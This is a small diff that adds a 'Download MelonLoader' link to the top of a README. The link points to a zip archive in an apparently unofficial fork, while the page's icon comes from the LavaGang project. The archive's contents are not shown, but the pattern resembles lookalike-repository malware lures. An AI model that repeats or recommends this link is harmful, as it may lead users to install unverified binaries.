@@ -1,3 +1,4 @@
+# [Download MelonLoader](https://github.com/ganxmdz/MelonLoader/blob/main/BaseLibs/MelonLoader.zip)
 
 <p align="center">
   <a href="#"><img src="https://raw.githubusercontent.com/LavaGang/MelonLoader.Installer/master/Resources/ML_Icon.png"></a>
